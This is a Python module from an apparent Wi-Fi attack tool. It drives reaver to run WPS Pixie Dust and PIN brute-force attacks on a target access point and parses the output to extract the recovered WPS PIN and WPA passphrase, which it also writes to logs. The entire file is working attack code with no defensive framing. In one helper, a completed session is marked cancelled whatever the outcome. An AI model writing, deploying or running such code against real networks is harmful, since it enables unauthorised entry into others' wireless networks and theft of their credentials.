# ============================================================
# Alfa Commander - WPS Attack Logic
# هجمات WPS (Pixie Dust و PIN)
# ============================================================

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

from app.constants import AttackState
from app.core.tools import reaver
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


@dataclass
class WPSSession:
    session_id: str
    bssid: str
    channel: int
    mode: str = "pixie"                     # pixie / pin
    state: str = AttackState.IDLE
    started_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None
    wps_pin: Optional[str] = None
    wpa_psk: Optional[str] = None
    ssid: Optional[str] = None
    progress_percent: int = 0
    attempts: int = 0
    log: list[str] = field(default_factory=list)
    error: Optional[str] = None

    @property
    def success(self) -> bool:
        return bool(self.wpa_psk or self.wps_pin)


class WPSAttack:
    """
    يدير هجوم WPS عبر reaver.
    يحلل المخرجات تلقائياً لاستخراج PIN و PSK.
    """

    def __init__(
        self,
        interface: str,
        bssid: str,
        channel: int,
        mode: str = "pixie",           # pixie / pin
        pin: Optional[str] = None,
        output_dir: Optional[Path] = None,
        on_event: Optional[Callable[[str, dict], None]] = None,
    ):
        self.interface = interface
        self.bssid = normalize_mac(bssid)
        self.channel = channel
        self.mode = mode
        self.pin = pin
        self.output_dir = output_dir
        self.on_event = on_event

        self.session = WPSSession(
            session_id=f"wps_{int(datetime.now().timestamp())}",
            bssid=self.bssid,
            channel=channel,
            mode=mode,
        )
        self._process: Optional[reaver.StreamingProcess] = None

    async def start(self) -> WPSSession:
        self.session.state = AttackState.RUNNING
        self.session.started_at = datetime.now()

        opts = reaver.ReaverOptions(
            interface=self.interface,
            bssid=self.bssid,
            channel=self.channel,
            pin=self.pin,
            pixie_dust=(self.mode == "pixie"),
            output_dir=self.output_dir,
            verbose=True,
        )

        self._process = await reaver.Reaver.attack(opts)
        self._process.on_stdout = self._handle_line
        self._process.on_stderr = self._handle_line
        self._process.on_exit = self._handle_exit

        self._emit("started", {
            "session_id": self.session.session_id,
            "bssid": self.bssid,
            "mode": self.mode,
        })

        logger.info(f"بدء هجوم WPS ({self.mode}) على {self.bssid}")
        return self.session

    async def stop(self) -> WPSSession:
        if self._process and self._process.running:
            await self._process.stop()
        self.session.state = AttackState.CANCELLED
        self.session.finished_at = datetime.now()
        return self.session

    def _handle_line(self, line: str):
        if not line:
            return
        self.session.log.append(line)

        # استخراج التقدم
        m = re.search(r"(\d+\.\d+)%\s+complete", line)
        if m:
            self.session.progress_percent = int(float(m.group(1)))
            self._emit("progress", {
                "session_id": self.session.session_id,
                "progress": self.session.progress_percent,
            })

        # عد المحاولات
        if "Trying pin" in line or "Sending EAPOL" in line:
            self.session.attempts += 1

        # WPS PIN
        m = re.search(r"WPS PIN:\s*'?(\d{4,8})'?", line, re.IGNORECASE)
        if m:
            self.session.wps_pin = m.group(1)
            self._emit("pin_found", {
                "session_id": self.session.session_id,
                "pin": self.session.wps_pin,
            })
            logger.info(f"تم العثور على WPS PIN: {self.session.wps_pin}")

        # WPA PSK
        m = re.search(r"WPA PSK:\s*'([^']+)'", line, re.IGNORECASE)
        if m:
            self.session.wpa_psk = m.group(1)
            self._emit("psk_found", {
                "session_id": self.session.session_id,
                "psk": self.session.wpa_psk,
            })
            logger.info(f"تم العثور على WPA PSK: {self.session.wpa_psk}")

        # SSID
        m = re.search(r"SSID:\s*'([^']+)'", line, re.IGNORECASE)
        if m:
            self.session.ssid = m.group(1)

        # Pixie Dust فشل
        if "Pixie Dust attack failed" in line or "Failed to recover" in line:
            self.session.error = "فشل هجوم Pixie Dust"

    def _handle_exit(self, rc: int):
        if self.session.state == AttackState.RUNNING:
            if self.session.success:
                self.session.state = AttackState.SUCCESS
            else:
                self.session.state = AttackState.FAILED
                if not self.session.error:
                    self.session.error = f"reaver انتهى برمز {rc}"

        self.session.finished_at = datetime.now()
        self._emit("finished", {
            "session_id": self.session.session_id,
            "state": self.session.state,
            "wps_pin": self.session.wps_pin,
            "wpa_psk": self.session.wpa_psk,
            "ssid": self.session.ssid,
            "attempts": self.session.attempts,
        })

        logger.info(
            f"انتهى هجوم WPS [{self.session.session_id}]: "
            f"state={self.session.state} pin={self.session.wps_pin} psk={self.session.wpa_psk}"
        )

    def _emit(self, event: str, data: dict):
        if self.on_event:
            try:
                self.on_event(event, data)
            except Exception:
                pass


async def pixie_dust(
    interface: str,
    bssid: str,
    channel: int,
    duration: int = 300,
) -> WPSSession:
    attack = WPSAttack(
        interface=interface,
        bssid=bssid,
        channel=channel,
        mode="pixie",
    )
    session = await attack.start()
    import asyncio
    await asyncio.sleep(duration)
    session = await attack.stop()
    return session


async def pin_attack(
    interface: str,
    bssid: str,
    channel: int,
    pin: Optional[str] = None,
) -> WPSSession:
    attack = WPSAttack(
        interface=interface,
        bssid=bssid,
        channel=channel,
        mode="pin",
        pin=pin,
    )
    return await attack.start()
